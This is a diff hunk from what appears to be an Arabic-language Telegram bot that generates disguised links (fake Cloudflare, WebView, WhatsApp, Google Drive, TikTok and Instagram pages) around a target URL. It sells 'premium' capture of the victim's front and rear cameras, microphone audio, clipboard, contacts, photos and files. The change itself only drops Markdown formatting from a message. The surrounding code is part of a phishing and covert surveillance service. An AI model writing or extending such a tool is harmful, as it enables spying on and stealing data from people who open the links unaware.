@@ -1042,11 +1042,11 @@ async function createLink(cid, msg) {
       ? `\n\n📒 جهات الاتصال (بريميوم):\n${coLink}\n\n🖼️ صور وملفات (بريميوم):\n${fLink}`
       : "";
     const upsellNote = !isPremium(cid)
-      ? `\n\n━━━━━━━━━━━━━━━\n💎 *ميزات البريميوم:*\n📷 كاميرا أمامية + خلفية\n🎤 تسجيل صوتي\n📋 محتوى الحافظة\n📒 جهات الاتصال الكاملة\n🖼️ صور وملفات الجهاز\n\nللاشتراك تواصل مع @Ye_x00`
+      ? `\n\n━━━━━━━━━━━━━━━\n💎 ميزات البريميوم:\n📷 كاميرا أمامية + خلفية\n🎤 تسجيل صوتي\n📋 محتوى الحافظة\n📒 جهات الاتصال الكاملة\n🖼️ صور وملفات الجهاز\n\nللاشتراك تواصل مع @Ye_x00`
       : "";
     bot.sendMessage(cid,
       `✅ تم إنشاء الروابط!\n🔗 URL: ${trimmed}\n\n🛡️ Cloudflare:\n${cLink}\n\n🖥️ WebView:\n${wLink}\n\n💬 WhatsApp:\n${waLink}\n\n📁 Google Drive:\n${dlLink}\n\n🎵 TikTok:\n${ttLink}\n\n📷 Instagram:\n${igLink}${premiumSection}${upsellNote}`,
-      { parse_mode: "Markdown", reply_markup: JSON.stringify({ inline_keyboard: [
+      { reply_markup: JSON.stringify({ inline_keyboard: [
         [{ text:"🔗 إنشاء رابط جديد", callback_data:"crenew" }],
         [{ text:"📷 QR Code", callback_data:`qr:${cid}` }]
       ] }) }
